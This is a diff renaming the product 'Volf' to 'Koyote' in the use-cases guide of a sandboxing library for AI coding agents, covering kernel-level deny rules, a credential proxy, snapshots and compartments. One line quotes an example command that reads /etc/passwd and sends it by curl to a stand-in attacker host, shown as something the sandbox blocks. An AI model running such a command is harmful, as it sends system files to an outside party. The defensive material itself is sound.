@@ -1,4 +1,4 @@
-# Volf : Use Cases & Working Examples
+# Koyote : Use Cases & Working Examples
 
 Every snippet below was executed against the built wheel on macOS (Seatbelt
 kernel sandbox). The sandbox layer is exercised in an isolated subprocess
@@ -8,7 +8,7 @@ same way the test suite does.
 
 Quick reference : this is the state of the art these examples replace:
 
-| What people run today | Its gap | Volf |
+| What people run today | Its gap | Koyote |
 | :--- | :--- | :--- |
 | Agents on the bare host, `--dangerously-skip-permissions` | Agent has your SSH keys, cloud creds, browser data, network | `SandboxRunner` deny-by-default; kernel blocks `~/.ssh`, `~/.aws` |
 | Git worktrees | Protects the *branch*, not credentials or network | Kernel denies the file/network read regardless of branch |
@@ -25,14 +25,14 @@ reads `~/.ssh`, `~/.aws`, keychains, and `.env`; it can shell out to
 `curl`/`python`/`node` which all inherit that access; its API key is in an env
 var the agent can see and exfiltrate.
 
-**Volf:** the agent runs in one compartment with a credential proxy in
+**Koyote:** the agent runs in one compartment with a credential proxy in
 front of the model API. The kernel denies reads of SSH keys, cloud configs,
 browser data, and git credentials; the network is localhost-only unless granted;
 and the raw API key is injected at the proxy : the agent never holds it.
 
 ```python
-from volf.hooks import SandboxRunner
-from volf.sandbox.proxy import RouteConfig
+from koyote.hooks import SandboxRunner
+from koyote.sandbox.proxy import RouteConfig
 
 runner = SandboxRunner(
     workdir=".",                       # the repo the agent may touch
@@ -71,14 +71,14 @@ fire a Docker container. `exec()` is bypassable (any `os.system`, any C
 extension); Docker is cold (image pull dominates startup) and unavailable to
 `exec` subprocesses.
 
-**Volf:** the REPL tool writes the snippet to an isolated temp file and runs
+**Koyote:** the REPL tool writes the snippet to an isolated temp file and runs
 it in its own compartment. `fs_read`/`fs_write`/`fs_exec` are granted, `network`
 is denied, so code that generates `os.system("curl …attacker…/$(cat /etc/passwd)")`
 is denied at the kernel for the file read **and** the network call, even
 through a subprocess.
 
 ```python
-from volf.hooks import SandboxRunner
+from koyote.hooks import SandboxRunner
 
 runner = SandboxRunner(workdir=".", sandbox=False, block_network=True)  # sandbox=True in prod
 res = runner.run_code(
@@ -104,11 +104,11 @@ prompt-injected agent prompts can read and ship out : the 2026 supply-chain
 attacks (a malicious dependency hiding instructions in a project) turn that into
 a real pre-vector.
 
-**Volf:** the agent never sees the key. `RouteConfig` rewrites the proxyed
+**Koyote:** the agent never sees the key. `RouteConfig` rewrites the proxyed
 request path and injects `Authorization` from the env at the proxy:
 
 ```python
-from volf.sandbox.proxy import RouteConfig, CredentialProxy
+from koyote.sandbox.proxy import RouteConfig, CredentialProxy
 
 rc = RouteConfig(
     prefix="/v1",
@@ -142,15 +142,15 @@ hop-by-hop headers stripped, absolute-form and origin-form both handled. Verifie
 (Deleting files, moving dirs, and writing binary test fixtures are the usual
 pain.)
 
-**Volf:** snapshots record a BLAKE3 content-addressed manifest of the
+**Koyote:** snapshots record a BLAKE3 content-addressed manifest of the
 worktree (skipping `.git`, `node_modules`, `target`, venvs, etc.) and `restore()`
 copies **only the files whose hash changed** : so deleted files come back and
 untouched files stay. Audit: `diffs` returns added/modified/deleted paths per run.
 
 ```python
-from volf.sandbox.snapshot import SnapshotManager
+from koyote.sandbox.snapshot import SnapshotManager
 
-snap = SnapshotManager(workdir="/path/project", snapshot_dir="/tmp/.volf/snaps")
+snap = SnapshotManager(workdir="/path/project", snapshot_dir="/tmp/.koyote/snaps")
 count = snap.snapshot()                     # index every file (blake3)
 
 # ... agent run mutates file_a.txt and creates new_file.txt ...
@@ -170,18 +170,18 @@ deleted file is restored from the index.
 **Today:** an orchestrator that fans a task into a dozen sub-agents spins up a
 microVM or container per sub-task : boot per sandbox plus per-VM cost.
 
-**Volf:** compartments are in-process kernel rules; each `Volf` gets its
+**Koyote:** compartments are in-process kernel rules; each `Koyote` gets its
 own policy. Registration order runs; `edge()` wires message paths between
 compartments. No boot, no daemon, ~0 incremental cost.
 
 ```python
-from volf import Volf
-from volf.compartments import Compartment, CompartmentConfig
+from koyote import Koyote
+from koyote.compartments import Compartment, CompartmentConfig
 
-volf = Volf(workdir=".")
+koyote = Koyote(workdir=".")
 
 for i in range(8):
-    volf.add(Compartment(
+    koyote.add(Compartment(
         name=f"task_{i}",
         fn=lambda ctx, i=i: {"result": i * 10},
         config=CompartmentConfig(
@@ -190,13 +190,13 @@ for i in range(8):
         ),
     ))
 
-volf.edge("task_0", "task_1")               # directed message path
-result = volf.run()                         # status, compartment outputs, elapsed
+koyote.edge("task_0", "task_1")               # directed message path
+result = koyote.run()                         # status, compartment outputs, elapsed
 print(result.status, [k for k in result.output])
 ```
 
-The `AgentVolf` variant auto-loads behaviour modules (credential proxy,
-snapshots, compression) via `VolfConfig(auto_modules=True)`; `Volf`
+The `AgentKoyote` variant auto-loads behaviour modules (credential proxy,
+snapshots, compression) via `KoyoteConfig(auto_modules=True)`; `Koyote`
 stays empty-by-default and everything here is opt-in.
 
 ---
@@ -209,25 +209,25 @@ or a data-science subprocess.
 
 ```python
 # LangGraph : wrap any node callable in a sandboxed compartment.
-from volf.hooks import VolfGraphNode
-node = VolfGraphNode(crunch, workdir=".", block_network=True)
+from koyote.hooks import KoyoteGraphNode
+node = KoyoteGraphNode(crunch, workdir=".", block_network=True)
 
 # LangChain REPL tool
-from volf.hooks import VolfPythonREPLTool
-tool = VolfPythonREPLTool(permission=["fs_read", "fs_write", "fs_exec"])
+from koyote.hooks import KoyotePythonREPLTool
+tool = KoyotePythonREPLTool(permission=["fs_read", "fs_write", "fs_exec"])
 tool.invoke("print(6 * 7)")
 
 # CrewAI : replace the Docker code interpreter
-from volf.hooks import VolfCodeInterpreterTool
-agent = Agent(tools=[VolfCodeInterpreterTool(block_network=True)], …)
+from koyote.hooks import KoyoteCodeInterpreterTool
+agent = Agent(tools=[KoyoteCodeInterpreterTool(block_network=True)], …)
 
 # AutoGen : each code block in its own compartment
-from volf.hooks import VolfCodeExecutor, CodeBlock
-executor = VolfCodeExecutor()
+from koyote.hooks import KoyoteCodeExecutor, CodeBlock
+executor = KoyoteCodeExecutor()
 res = executor.execute_code_blocks([CodeBlock("python", "print('hi')")])
 
 # Data / RAG : mount ONLY the datasets; no network route out
-from volf.hooks import DataScienceSandboxHook
+from koyote.hooks import DataScienceSandboxHook
 hook = DataScienceSandboxHook(allow_network=False)
 hook.mount_dataset("customers.csv")          # only this is visible
 res = hook.run("df = pd.read_csv('customers.csv'); print(df.shape)")
@@ -235,5 +235,5 @@ print(res.diffs)                              # audited mutations
 hook.cleanup()
 ```
 
-All examples above run against `volf==1.0.4` as installed from PyPI / wheel
+All examples above run against `koyote==1.0.4` as installed from PyPI / wheel
 (including the Rust `_core`).
